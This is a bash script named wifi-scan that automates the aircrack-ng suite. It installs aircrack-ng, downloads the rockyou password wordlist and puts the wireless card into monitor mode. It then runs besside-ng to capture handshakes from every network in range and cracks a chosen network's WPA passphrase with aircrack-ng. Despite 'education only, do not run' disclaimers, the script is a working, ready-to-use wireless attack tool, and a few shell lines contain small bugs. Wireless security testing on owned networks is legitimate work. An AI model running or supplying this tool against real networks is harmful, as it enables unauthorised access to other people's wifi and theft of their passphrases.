#!/bin/bash

# This script is for education purposes only and should not be executed.
# Do NOT execute on public networks.

# Helpful Commands
# sudo lshw -C network # Get all details about the wifi interface

RED=$(tput setaf 1) #'\033[31m'
GREEN=$(tput setaf 2) #'\033[32m'
YELLOW=$(tput setaf 3) #'\033[33m'
BLUE=$(tput setaf 4) #'\033[34m'
GRAY=$(tput setaf 8) #'\033[90m'
RESET=$(tput sgr0) #'\033[0m'

ME=$(basename "${0}")
VERSION="v0.01"

INSTALL_FOLDER=~/apps
WORDLIST_FOLDER=~/apps/aircrack-ng/wordlists
CAPTURE_FOLDER=~/capture

ROCKYOU_URL="https://github.com/zacheller/rockyou/blob/master/rockyou.txt.tar.gz?raw=true"

AIRPORT_CMD="/System/Library/PrivateFrameworks/Apple80211.framework/Versions/Current/Resources/airport"

function _default() {
  cat <<HEREDOC
${GREEN}wifi-scan${RESET}
WiFi Scanner (${VERSION}). Use -h or --help param for help.
${GRAY}WARNING: DO NOT USE THIS PROGRAM! DO NOT RUN IT!${RESET}

${YELLOW}USAGE:${RESET}
    wifi-scan <SUBCOMMAND> <PARAMS>
    ${GRAY}wifi-scan run wlan0${RESET}
    ${GRAY}wifi-scan list${RESET}
    ${GRAY}wifi-scan crack "00:00:11:22:33:44"${RESET}

${YELLOW}SUBCOMMANDS:${RESET}
    ${GREEN}run       ${RESET}Run wide scan. Optional param inteface (e.g. wlan0). Stop with CTRL+C.
    ${GREEN}install   ${RESET}Clones and installs aircrack-ng suite. Linux only, needs internet.
    ${GREEN}update    ${RESET}Pull and re-build aircrack-ng installation.
    ${GREEN}available ${RESET}List available WiFis with channels.
    ${GREEN}download  ${RESET}Download and unzip rockyou.txt wordlist (50MB).
    ${GREEN}list      ${RESET}List all owned/discovered networks (get BSSID here).
    ${GREEN}crack     ${RESET}Crack passphrase after scan. Required param BSSID (e.g. "00:00:11:22:33:44")

HEREDOC
  _validate
}

function _install() {
  echo -e "${YELLOW}wifi-scan${RESET} > ${GREEN}install${RESET}"

  # Mac OS X only.
  if [[ "$(uname)" == "Darwin" ]]; then
    _validate brew
    mkdir -p /usr/local/bin
    sudo ln -s "${AIRPORT_CMD}" /usr/local/bin/airport
    sudo brew install aircrack-ng
    if [ $? -eq 0 ]; then
      echo -e "[${GREEN}DONE${RESET}] Installation successful"
      exit 0
    fi
    exit 1
  fi

  # Linux only.
  sudo apt-get install build-essential autoconf automake \
      libtool pkg-config libnl-3-dev libnl-genl-3-dev libssl-dev \
      ethtool shtool rfkill zlib1g-dev libpcap-dev libsqlite3-dev \
      libpcre2-dev libhwloc-dev libcmocka-dev hostapd wpasupplicant \
      tcpdump screen iw usbutils expect
  mkdir -p $INSTALL_FOLDER
  cd $INSTALL_FOLDER
  git clone http://github.com/aircrack-ng/aircrack-ng
  cd aircrack-ng
  autoreconf -i
  ./configure
  make
  make install
  if [ $? -eq 0 ]; then
    echo -e "[${GREEN}DONE${RESET}] Installation successful"
  fi
}

function _update() {
  echo -e "${YELLOW}wifi-scan${RESET} > ${GREEN}update${RESET}"
  # Mac OS X only.
  if [[ "$(uname)" == "Darwin" ]]; then
    echo -e ""
    echo -e "[${RED}Not Supported${RESET}] Update is not supported on MacOS."
  fi

  cd $INSTALL_FOLDER/aircrack-ng
  git pull
  autoreconf -i
  ./configure
  make
  if [ $? -eq 0 ]; then
    echo -e "[${GREEN}DONE${RESET}] Update successful"
  fi
}

function _validate() {
  REQUIRED=${@:-"airmon-ng besside-ng"}
  MISSING=""
  for i in $REQUIRED ; do
    command -v $i >/dev/null && continue || { MISSING="$MISSING $i"; }
  done
  if [ "$MISSING" ]; then
    echo -e "${RED}MISSING DEPENDENCY:${RESET}"
    for m in $MISSING ; do
      echo -e "    ${RED}$m${RESET} not found"
    done
    echo -e ""
    echo -e "    Please run \"${ME} install\""
    echo -e ""
    exit 1
  fi
}

function _download() {
  echo -e "${YELLOW}wifi-scan${RESET} > ${GREEN}download${RESET}"
  echo -e ""
  echo -e "[${BLUE}START${RESET}] Downloading rockyou.txt"

  mkdir -p $WORDLIST_FOLDER
  local result=0
  if [ command -v curl >/dev/null ]; then
    curl $ROCKYOU_URL -o $WORDLIST_FOLDER/rockyou.txt.tar.gz
    result = $?
  else
    wget $ROCKYOU_URL -O $WORDLIST_FOLDER/rockyou.txt.tar.gz
    result = $?
  fi
  if [ $result -eq 0 ]; then
    echo -e "[${GREEN}DONE${RESET}] Download of rockyou.txt.tar.gz successful"
  else
    echo -e "[${RED}ERROR${RESET}] Download of rockyou.txt.tar.gz failed"
    exit 1
  fi
  tar xvzf $WORDLIST_FOLDER/rockyou.txt.tar.gz -C $WORDLIST_FOLDER
  echo -e "[${GREEN}DONE${RESET}] Unzip of rockyou.txt.tar.gz successful"
}

function _run() {
  echo -e "${YELLOW}wifi-scan${RESET} > ${GREEN}run${RESET}"
  echo -e "WiFi Scan (v.01)."
  echo -e ""

  _validate

  echo -e "[${BLUE}START${RESET}] Initiating the scan with wifi-scan"

  # Create and always use capture dir.
  mkdir -p $CAPTURE_FOLDER
  cd $CAPTURE_FOLDER

  # Set the wifi wlan as variable.
  export TARGET_WLAN=${2:-'wlp0s20f3'}

  # Clean up apps that may cause trouble.
  sudo airmon-ng check kill

  # Put your network device into monitor mode.
  sudo airmon-ng start $TARGET_WLAN
  echo -e "[${GREEN}DONE${RESET}] Switched WiFi device to monitor mode"

  # Start the scan. From here it goes automatically.
  echo -e "[${BLUE}START${RESET}] Starting scan"
  sudo besside-ng $TARGET_WLAN"mon"
  # Custom Wifi: sudo besside-ng -R "wifiABC" $TARGET_WLAN"mon"

  echo -e "[${GREEN}DONE${RESET}] Scan finished. Recovering WiFi."

  # Return wifi to managed state.
  sudo airmon-ng stop $TARGET_WLAN"mon"
  sudo /etc/init.d/network-manager start
  sudo systemctl start NetworkManager

  echo -e "[${GREEN}DONE${RESET}] Recovered original WiFi"
  echo -e "Don't upload the results to https://wpa-sec.stanev.org for automated cracking"
}

function _list() {
  echo -e "${YELLOW}wifi-scan${RESET} > ${GREEN}list${RESET}"
  echo -e ""
  cat $CAPTURE_FOLDER/besside.log
}

function _available() {
  echo -e "${YELLOW}wifi-scan${RESET} > ${GREEN}available${RESET}"
  echo -e ""
  echo -e "[${BLUE}START${RESET}] Scanning for available WiFis"
  # Mac OS X only.
  if [[ "$(uname)" == "Darwin" ]]; then
    # Getting BSSID requires sudo.
    sudo ${AIRPORT_CMD} -s
  fi

  # Linux only.
  if [[ "$(uname)" == "Linux" ]]; then
    nmcli dev wifi list
  fi
}

function _crack() {
  echo -e "${YELLOW}wifi-scan${RESET} > ${GREEN}crack${RESET}"
  echo -e ""
  _validate "aircrack-ng"

  wordlist=$WORDLIST_FOLDER/${3:-'rockyou.txt'}
  bssid=$2 # e.g. "00:11:22:33:44:55"
  # Appending "| tee" on the end to make it possible to stop with Ctrl+C
  aircrack-ng -w "$wordlist" -b "$bssid" $CAPTURE_FOLDER/wpa.cap | tee
  # Uncomment to crack WEP (you need to catch enough IVs for that)
  # aircrack-ng -b "$bssid" $CAPTURE_FOLDER/wep.cap | tee
  echo -e "[${GREEN}DONE${RESET}] Done"
}

case $1 in
  --help|-h)  _default    ; exit 0 ;;
  install)    _install    ; exit 0 ;;
  run)        _run $@     ; exit 0 ;;
  update)     _update $@  ; exit 0 ;;
  available)  _available  ; exit 0 ;;
  download)   _download   ; exit 0 ;;
  list)       _list       ; exit 0 ;;
  crack)      _crack $@   ; exit 0 ;;
  *)          _default    ; exit 0 ;;
esac
